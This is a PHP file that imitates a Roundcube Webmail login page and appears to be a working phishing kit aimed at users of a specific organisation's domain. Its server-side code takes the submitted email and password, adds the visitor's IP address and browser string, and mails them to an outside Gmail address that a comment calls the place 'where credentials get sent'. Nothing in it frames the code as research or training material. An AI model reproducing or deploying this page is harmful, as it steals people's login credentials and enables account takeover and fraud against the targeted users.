<?php
$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);

    // where credentials get sent
    $to = "nxloaded@gmail.com";
    $subject = "Webmail Login Attempt";

    $msg = "Email: ".$email."\n";
    $msg .= "Password: ".$password."\n";
    $msg .= "IP: ".$_SERVER['REMOTE_ADDR']."\n";
    $msg .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";

    $headers = "From: notifier@server.com";

    mail($to,$subject,$msg,$headers);

    $message = "submitted successfully.";
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Roundcube Webmail</title>

<style>

body{
    background:#e5e5e5;
    font-family: Arial, Helvetica, sans-serif;
}

.wrapper{
    width:350px;
    margin:120px auto;
    text-align:center;
}

.logo{
    width:50px;
    height:50px;
    background:linear-gradient(135deg,#444 50%,#3da4d7 50%);
    border-radius:10px;
    margin:0 auto 30px auto;
    position:relative;
}

.logo:after{
    content:"";
    width:60px;
    height:60px;
    background:#d9d9d9;
    border-radius:50%;
    position:absolute;
    top:-25px;
    left:15px;
}

input{
    width:100%;
    padding:12px;
    margin-top:10px;
    border:1px solid #cfcfcf;
    border-radius:4px;
    font-size:14px;
}

button{
    width:107%;
    padding:12px;
    margin-top:15px;
    background:#3da4d7;
    border:none;
    color:white;
    font-size:16px;
    border-radius:4px;
    cursor:pointer;
}

button:hover{
    background:#2f8fbf;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#666;
}

.error{
    color:red;
    margin-bottom:10px;
}

</style>
</head>

<body>

<div class="wrapper">

<div class="logo"></div>

<?php if($message!=""){ ?>
<div class="error"><?php echo $message; ?></div>
<?php } ?>

<form method="POST">

<input type="text" name="email" placeholder="contact@lunasibec.ro" required>

<input type="password" name="password" placeholder="Password" required>

<button type="submit">LOGIN</button>

</form>

<div class="footer">
Roundcube Webmail
</div>

</div>

</body>
</html>